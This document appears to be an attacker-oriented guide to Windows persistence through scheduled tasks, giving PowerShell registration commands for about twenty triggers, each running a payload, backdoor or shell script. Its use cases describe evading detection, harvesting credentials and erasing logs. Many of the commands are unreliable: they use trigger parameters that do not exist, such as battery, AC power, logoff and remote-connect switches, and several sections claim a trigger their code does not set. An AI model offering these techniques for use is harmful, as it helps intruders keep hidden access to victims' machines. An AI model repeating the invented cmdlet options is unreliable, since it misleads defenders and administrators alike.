When leveraging scheduled tasks for persistence on a Windows host, various actions and trigger combinations can be applied using PowerShell. These methods allow an attacker to ensure their payload or persistence mechanism re-executes at intervals or upon certain system events, ensuring consistent access or persistence on the target. Below is a comprehensive list of viable scheduled task actions and trigger combinations for persistence on a Windows host using PowerShell:

#### Trigger on Logon
   - Description: A scheduled task that is triggered whenever a specific user or any user logs into the system. This is one of the most common ways to persist a backdoor or malicious script.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogon
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "LogonTask" -Description "Persistent Payload"
     ```
   - Use Case: This is viable for persistence since it ensures that the task executes each time a user logs in, providing an attacker access when the target logs in.

#### Trigger on System Startup
   - Description: A task that triggers when the system starts, before any user logs in.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\path\to\backdoor.bat"
     $trigger = New-ScheduledTaskTrigger -AtStartup
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "StartupTask" -Description "Persistent Backdoor"
     ```
   - Use Case: Persistence at system startup guarantees execution as soon as the system powers on, making it ideal for attackers who want their payloads to run at the earliest possible time.

#### Daily Time-Based Trigger
   - Description: Executes a task every day at a specific time. This type of task can be less obvious than a logon or startup task and may evade detection during typical forensic analysis.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\recon.ps1"
     $trigger = New-ScheduledTaskTrigger -Daily -At "10:00AM"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "DailyReconTask" -Description "Daily Recon Script"
     ```
   - Use Case: A time-based trigger might be useful for periodic data exfiltration or executing a persistence payload on a daily schedule, blending into legitimate system activity.

#### Trigger on Idle
   - Description: A task that triggers when the system is idle, such as when the user is not actively interacting with the system.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\shell.ps1"
     $trigger = New-ScheduledTaskTrigger -AtIdle
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "IdleShellTask" -Description "Idle Shell Execution"
     ```
   - Use Case: Triggering the task during idle time can help avoid detection because it runs when the system is not in use, reducing the likelihood of raising user suspicion.

#### Trigger on Specific Event (Event Log Trigger)
   - Description: This trigger is activated when a specific event occurs in the event log, such as a service failure, or an authentication failure.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogon
     $eventTrigger = New-ScheduledTaskTrigger -LogonType "LocalSystem" -Subscription "Event[System[(EventID=4625)]]"
     Register-ScheduledTask -Action $action -Trigger $eventTrigger -TaskName "EventTriggerTask" -Description "Triggered on Failed Login"
     ```
   - Use Case: Triggering based on an event (e.g., failed login attempts) allows for a more advanced and stealthy persistence mechanism, executing the payload only when specific conditions are met.

#### Weekly Trigger
   - Description: Triggers the task weekly, on specific days of the week. This task could be configured to run outside of business hours to avoid suspicion.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to/weekly_task.ps1"
     $trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek "Sunday" -At "2:00AM"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WeeklyTask" -Description "Weekly Maintenance Task"
     ```
   - Use Case: A weekly task can be used to schedule persistence actions on days and times that system administrators may not be as vigilant, such as during weekends or off-peak hours.

#### Trigger on Task Failure
   - Description: Create a task that only runs after a specific task fails. This could be combined with other administrative tasks or antivirus tasks to evade detection.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\path\to\failback.bat"
     $trigger = New-ScheduledTaskTrigger -AtTaskFailure "OtherTaskName"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "FailbackTask" -Description "Fallback on Task Failure"
     ```
   - Use Case: By executing a payload when another critical task fails (e.g., antivirus or system maintenance tasks), attackers can ensure fallback persistence mechanisms, allowing their payload to activate if the system becomes compromised.

#### Trigger on Workstation Unlock
   - Description: Trigger a task each time the workstation is unlocked. This trigger can be used to reactivate malicious code after periods of inactivity.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\shell.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogon -User "DOMAIN\User"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UnlockShellTask" -Description "Payload on Workstation Unlock"
     ```
   - Use Case: Perfect for scenarios where an attacker wants to regain access as soon as a legitimate user returns to their machine and unlocks it, providing a persistence mechanism tied to user activity.

#### Trigger on User Disconnect
   - Description: This trigger will execute when a user session is disconnected (e.g., when an RDP session ends or the user locks the workstation).
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\cleanup.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogoff
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "LogoffCleanupTask" -Description "Execute Task on Logoff"
     ```
   - Use Case: This is particularly useful for cleanup tasks or to ensure persistence when the user disconnects or logs off.

#### Trigger on Network Connection
   - Description: Triggers the task when the system connects to a specific network or any network. 
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\persistence.ps1"
     $trigger = New-ScheduledTaskTrigger -AtTaskCreation
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "NetworkConnectTask" -Description "Persistence on Network Connect"
     ```
   - Use Case: Perfect for persistence when a machine connects to specific networks, allowing an attacker to activate when the machine re-establishes network connectivity.

#### Trigger on Task Registration
   - Description: This trigger activates when a new task is registered or modified. It can be used to detect and react when new scheduled tasks are created or when existing ones are changed. 
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtTaskRegistration
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "TaskRegistrationMonitor" -Description "Execute payload on task registration"
     ```
   - Use Case: This can be used as a secondary persistence method that activates when an attacker, defender, or admin creates or modifies scheduled tasks, potentially helping maintain access.

#### Trigger on Workstation Lock
   - Description: Similar to the unlock trigger, but this will activate when the workstation is locked. This could be useful for initiating processes when the user is leaving the system, such as capturing session data or credentials before the user logs off or locks their session.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogon -User "DOMAIN\User"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "LockTask" -Description "Execute on Workstation Lock"
     ```
   - Use Case: This can be used to persist access or perform tasks like credential harvesting or initiating key logging when the user locks their session.

#### Trigger on Workstation Logoff
   - Description: A task that triggers when the user logs off. This is useful for actions like cleaning up traces or setting up further persistence mechanisms.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\cleaner.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogoff
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "LogoffTask" -Description "Task Triggered on Logoff"
     ```
   - Use Case: This could be used to erase logs, close backdoor connections, or remove forensic traces just after a user session ends.

#### Trigger on User Session Change
   - Description: This task triggers on session state changes, such as when a user connects or disconnects a Remote Desktop Protocol (RDP) session. This is a stealthy way to maintain persistence, as attackers often leverage RDP for remote access.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\path\to\reconnect.bat"
     $trigger = New-ScheduledTaskTrigger -AtSessionChange
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SessionChangeTask" -Description "RDP Session Monitoring"
     ```
   - Use Case: This is particularly effective in environments where RDP sessions are common. By tying persistence to RDP session creation or reconnection, the attacker can regain access when users initiate remote sessions.

#### Trigger on Battery Power
   - Description: A scheduled task can be triggered when the computer switches to battery power. This could be a less common trigger, used to activate malicious activity when a laptop is unplugged.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\battery_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtBatteryPower
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BatteryTask" -Description "Trigger on Battery Power"
     ```
   - Use Case: This method can allow for persistent tasks to execute under specific power conditions, typically seen on laptops. An attacker could exploit this to deploy tasks that avoid detection on workstations that use battery power intermittently.

#### Trigger on AC Power
   - Description: Opposite of the battery power trigger, this task is triggered when the system switches to AC power (plugged in). Attackers can leverage this to avoid executing malware when the device is on battery (to prevent suspicion in corporate settings) but trigger activity once the laptop is plugged in.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\AC_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtACPower
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ACPowerTask" -Description "Trigger on AC Power"
     ```
   - Use Case: This would be useful in environments where devices often transition between power states (laptops in particular), ensuring tasks only execute when the system is plugged in, thus conserving resources and avoiding detection.

#### Trigger on Group Policy Refresh
   - Description: This trigger executes when Group Policy is refreshed, which happens periodically in Active Directory (AD) environments or when certain system changes are made.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\gpo_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogon -User "DOMAIN\Administrator"
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "GPORunTask" -Description "Trigger on Group Policy Refresh"
     ```
   - Use Case: This is useful for attackers who have compromised an AD environment and want to re-establish persistence each time a group policy is applied to the machine.

#### Trigger on Connected Network Profile Change
   - Description: This trigger is activated when the system switches between different network profiles (e.g., from a domain network to a public network). Attackers can take advantage of these transitions to trigger payloads only when the system connects to specific types of networks.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\network_profile_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtNetworkProfileChange
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "NetworkProfileTask" -Description "Trigger on Network Profile Change"
     ```
   - Use Case: This can be useful when an attacker wants persistence only under certain network conditions (e.g., the machine is connected to a corporate network or public Wi-Fi).

#### Trigger on AC Power Resumption
   - Description: This trigger is designed to activate when the computer resumes AC power after a power outage or when the device switches back to using plugged-in power after battery power. 
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\path\to\resume_task.bat"
     $trigger = New-ScheduledTaskTrigger -AtPowerChange
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PowerResumptionTask" -Description "Run Task on Power Resumption"
     ```
   - Use Case: This persistence method can be useful for ensuring tasks are re-triggered after system power interruptions, ensuring an attacker can maintain control even after unexpected outages.

#### Trigger on Time Synchronization
   - Description: This trigger activates when the system time is synchronized with a time server or corrected by an NTP (Network Time Protocol) service.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\timesync_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtTimeChange
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "TimeSyncTask" -Description "Task Triggered on Time Sync"
     ```
   - Use Case: This method is valuable for environments where frequent time changes occur (e.g., traveling users or VM environments where time syncs are common), allowing for periodic persistence to be activated as time sync events happen.

#### 2Trigger on Remote Desktop Connection
   - Description: This trigger activates when a Remote Desktop session is initiated, allowing payload execution specifically during remote connections.
   - PowerShell Command:
     ```powershell
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\rdp_payload.ps1"
     $trigger = New-ScheduledTaskTrigger -AtRemoteConnect
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "RDPConnectTask" -Description "Trigger on RDP Connection"
     ```
   - Use Case: This persistence mechanism is useful for attackers who target systems through RDP, triggering their payload as soon as a remote session is established.